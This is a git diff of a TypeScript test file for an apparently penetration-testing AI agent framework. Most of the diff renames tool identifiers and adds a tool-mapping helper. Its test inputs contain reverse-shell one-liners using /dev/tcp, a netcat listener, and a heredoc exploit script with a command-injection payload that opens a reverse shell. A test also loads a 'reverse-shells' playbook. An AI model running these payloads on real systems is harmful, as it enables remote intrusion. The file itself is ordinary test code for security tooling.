@@ -8,6 +8,7 @@ import type { BackendExecResult, BackendSessionResult, SessionKind } from "../sr
 import type { ToolExecutionBackend } from "../src/agent-tools/shared/backend";
 import { sanitizeToolOutput } from "../src/agent-tools/shared/output-sanitize";
 import { proxiedShellCommand, shouldAutoBackgroundShellCommand } from "../src/agent-tools/shell/exec";
+import { execCommandTool } from "../src/agent-tools/shell/exec-command";
 import type { ToolDefinition } from "../src/types";
 import type { Evidence, Finding, MemoryItem, Note, OutputArtifact, Session, TodoItem, TodoStatus, ToolContext } from "../src/types";
 
@@ -229,20 +230,20 @@ test("tool output sanitization preserves readable terminal output", () => {
   expect(sanitizeToolOutput(lossyButReadable)).toBe(lossyButReadable);
 });
 
-test("shell_exec auto-backgrounds obvious long-running interactive commands", () => {
+test("command_run auto-backgrounds obvious long-running interactive commands", () => {
   expect(shouldAutoBackgroundShellCommand("bash -i >& /dev/tcp/10.10.10.10/4444 0>&1")).toBe(true);
   expect(shouldAutoBackgroundShellCommand("nc -lvnp 4444")).toBe(true);
   expect(shouldAutoBackgroundShellCommand("tail -f /tmp/app.log")).toBe(true);
   expect(shouldAutoBackgroundShellCommand("echo quick && id")).toBe(false);
 });
 
-test("shell_exec proxy routing scopes proxy environment to one shell invocation", () => {
+test("command_run proxy routing scopes proxy environment to one shell invocation", () => {
   expect(proxiedShellCommand("curl https://example.com; wget https://example.org", "http://127.0.0.1:31337")).toBe(
     "export http_proxy='http://127.0.0.1:31337' https_proxy='http://127.0.0.1:31337'; unset HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; curl https://example.com; wget https://example.org"
   );
 });
 
-test("shell_exec does not misclassify a heredoc payload's literal text as an interactive command", () => {
+test("command_run does not misclassify a heredoc payload's literal text as an interactive command", () => {
   const writeExploitScript = [
     "cat << 'EXPLOIT' > /tmp/lpd_exploit.py",
     "payload = f\"' ; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' #\"",
@@ -257,11 +258,11 @@ test("shell_exec does not misclassify a heredoc payload's literal text as an int
   expect(shouldAutoBackgroundShellCommand(writeThenLaunchShell)).toBe(true);
 });
 
-test("exec_command honors workdir and bounds returned output", async () => {
+test("command_run honors workdir and bounds returned output", async () => {
   const dir = await mkdtemp(join(tmpdir(), "farai-tools-"));
   await mkdir(join(dir, "nested"));
-  const execCommand = mustGetTool("exec_command");
-  const writeStdin = mustGetTool("write_stdin");
+  const execCommand = mustGetTool("command_run");
+  const writeStdin = mustGetTool("command_input");
   const awaitCompletion = async (result: Awaited<ReturnType<ToolDefinition["run"]>>, maxOutputTokens?: number) => {
     if (result.status !== "running_background" || !result.processId) return result;
     return await writeStdin.run({
@@ -287,10 +288,10 @@ test("exec_command honors workdir and bounds returned output", async () => {
   expect(boundedResult.output).toContain("bytes omitted");
 });
 
-test("exec_command and write_stdin share one interactive process", async () => {
+test("command_run and command_input share one interactive process", async () => {
   const dir = await mkdtemp(join(tmpdir(), "farai-tools-"));
   const ctx = context(dir);
-  const started = await mustGetTool("exec_command").run({
+  const started = await mustGetTool("command_run").run({
     cmd: "read value; printf 'received:%s\\n' \"$value\"",
     tty: true,
     yield_time_ms: 250
@@ -298,7 +299,7 @@ test("exec_command and write_stdin share one interactive process", async () => {
   expect(started.status).toBe("running_background");
   expect(started.processId).toBeTruthy();
 
-  const finished = await mustGetTool("write_stdin").run({
+  const finished = await mustGetTool("command_input").run({
     session_id: started.processId,
     chars: "hello\\n",
     yield_time_ms: 1_000,
@@ -354,16 +355,16 @@ test("filesystem tools read, list, grep, write, edit, patch, and protect interna
     inspect: async () => { throw new Error("not used"); }
   };
 
-  await mustGetTool("fs_write").run({ path: "notes/service.txt", content: "port 80 open\napache\n" }, ctx);
+  await mustGetTool("file_write").run({ path: "notes/service.txt", content: "port 80 open\napache\n" }, ctx);
   await expect(readFile(join(dir, "notes", "service.txt"), "utf8")).resolves.toContain("apache");
 
-  const read = await mustGetTool("fs_read").run({ path: "notes/service.txt", offset: 1, limit: 1 }, ctx);
+  const read = await mustGetTool("file_read").run({ path: "notes/service.txt", offset: 1, limit: 1 }, ctx);
   expect(read.output).toBe("port 80 open");
 
-  const listed = await mustGetTool("fs_list").run({ path: ".", limit: 10 }, ctx);
+  const listed = await mustGetTool("file_list").run({ path: ".", limit: 10 }, ctx);
   expect(listed.output).toContain("notes/service.txt");
 
-  const grep = await mustGetTool("fs_grep").run({ pattern: "apache", path: ".", limit: 10 }, ctx);
+  const grep = await mustGetTool("file_search").run({ pattern: "apache", path: ".", limit: 10 }, ctx);
   expect(grep.output).toContain("notes/service.txt:2");
 
   const edit = await mustGetTool("fs_edit").run({ path: "notes/service.txt", oldString: "apache", newString: "nginx" }, ctx);
@@ -377,33 +378,33 @@ test("filesystem tools read, list, grep, write, edit, patch, and protect interna
   await expect(readFile(join(dir, "notes", "service.txt"), "utf8")).resolves.toContain("caddy");
   expect(diagnosed.sort()).toEqual(["notes/service.txt", "notes/service.txt", "notes/new.txt", "notes/service.txt"].sort());
 
-  await expect(mustGetTool("fs_read").run({ path: ".farai/farai.db" }, ctx)).rejects.toThrow("path is protected");
+  await expect(mustGetTool("file_read").run({ path: ".farai/farai.db" }, ctx)).rejects.toThrow("path is protected");
 
-  await mustGetTool("fs_write").run({ path: "../escape.txt", content: "bad" }, ctx);
-  const escaped = await mustGetTool("fs_read").run({ path: "/escape.txt" }, ctx);
+  await mustGetTool("file_write").run({ path: "../escape.txt", content: "bad" }, ctx);
+  const escaped = await mustGetTool("file_read").run({ path: "/escape.txt" }, ctx);
   expect(escaped.output).toBe("bad");
 });
 
 test("fs.* runs inside the Kali container: /workspace paths and arbitrary container paths (e.g. /tmp) both work, unlike the old host-jailed behavior", async () => {
   const dir = await mkdtemp(join(tmpdir(), "farai-tools-"));
   const ctx = context(dir);
-  await mustGetTool("fs_write").run({ path: "server.py", content: "print(1)\n" }, ctx);
+  await mustGetTool("file_write").run({ path: "server.py", content: "print(1)\n" }, ctx);
 
-  const viaContainerPath = await mustGetTool("fs_read").run({ path: "/workspace/server.py" }, ctx);
+  const viaContainerPath = await mustGetTool("file_read").run({ path: "/workspace/server.py" }, ctx);
   expect(viaContainerPath.output).toBe("print(1)\n");
 
-  await mustGetTool("fs_write").run({ path: "/tmp/only-in-container.py", content: "print(2)\n" }, ctx);
-  const viaTmp = await mustGetTool("fs_read").run({ path: "/tmp/only-in-container.py" }, ctx);
+  await mustGetTool("file_write").run({ path: "/tmp/only-in-container.py", content: "print(2)\n" }, ctx);
+  const viaTmp = await mustGetTool("file_read").run({ path: "/tmp/only-in-container.py" }, ctx);
   expect(viaTmp.output).toBe("print(2)\n");
 
-  await expect(mustGetTool("fs_read").run({ path: "/tmp/does-not-exist.py" }, ctx)).rejects.toThrow(/no such file or directory/);
+  await expect(mustGetTool("file_read").run({ path: "/tmp/does-not-exist.py" }, ctx)).rejects.toThrow(/no such file or directory/);
 });
 
 test("git tools expose status and diff", async () => {
   const dir = await mkdtemp(join(tmpdir(), "farai-git-"));
   const ctx = context(dir);
   Bun.spawnSync(["git", "init"], { cwd: dir, stdout: "ignore", stderr: "ignore" });
-  await mustGetTool("fs_write").run({ path: "README.md", content: "# test\n" }, ctx);
+  await mustGetTool("file_write").run({ path: "README.md", content: "# test\n" }, ctx);
   Bun.spawnSync(["git", "add", "README.md"], { cwd: dir, stdout: "ignore", stderr: "ignore" });
   Bun.spawnSync(["git", "-c", "user.name=Farai Test", "-c", "user.email=test@example.invalid", "commit", "-m", "initial"], { cwd: dir, stdout: "ignore", stderr: "ignore" });
   await mustGetTool("fs_edit").run({ path: "README.md", oldString: "# test", newString: "# test\n\nupdated" }, ctx);
@@ -432,17 +433,47 @@ test("skill_load returns matching playbooks and reports unknown names without th
     ].join("\n")
   );
   const ctx = context(workspace);
-  const known = await mustGetTool("skill_load").run({ name: "reverse-shells" }, ctx);
+  const known = await mustGetTool("knowledge_manage").run({ operation: "skill_load", args: { name: "reverse-shells" } }, ctx);
   expect(known.ok).toBe(true);
   expect(known.output).toContain("# loaded skill: reverse-shells");
   expect(known.output).toContain("callback_host_info");
 
-  const none = await mustGetTool("skill_load").run({ name: "totally-unknown" }, ctx);
+  const none = await mustGetTool("knowledge_manage").run({ operation: "skill_load", args: { name: "totally-unknown" } }, ctx);
   expect(none.ok).toBe(false);
 });
 
 function mustGetTool(name: string): ToolDefinition {
-  const tool = getTool(name);
+  const direct: Record<string, string> = {
+    code_write_script: "script_write",
+    command_run: "command_run",
+    command_input: "command_input",
+    file_write: "file_write",
+    file_read: "file_read",
+    file_list: "file_list",
+    file_search: "file_search",
+    fs_edit: "file_replace",
+    patch_apply: "file_patch"
+  };
+  const facade: Record<string, { tool: string; operation: string }> = {
+    evidence_save: { tool: "knowledge_manage", operation: "save" },
+    notes_add: { tool: "knowledge_manage", operation: "add" },
+    memory_add_hypothesis: { tool: "knowledge_manage", operation: "add_hypothesis" },
+    memory_mark_failed: { tool: "knowledge_manage", operation: "mark_failed" },
+    report_add_finding: { tool: "finding_manage", operation: "add_finding" },
+    todo_add: { tool: "task_manage", operation: "add" },
+    todo_update: { tool: "task_manage", operation: "update" },
+    todo_list: { tool: "task_manage", operation: "list" },
+    update_plan: { tool: "task_manage", operation: "plan" }
+  };
+  const facadeCall = facade[name];
+  if (name === "command_run") return execCommandTool;
+  const tool = getTool(facadeCall?.tool ?? direct[name] ?? name);
   if (!tool) throw new Error(`missing tool: ${name}`);
+  if (facadeCall) {
+    return {
+      ...tool,
+      run: (args, context) => tool.run({ operation: facadeCall.operation, args }, context)
+    };
+  }
   return tool;
 }
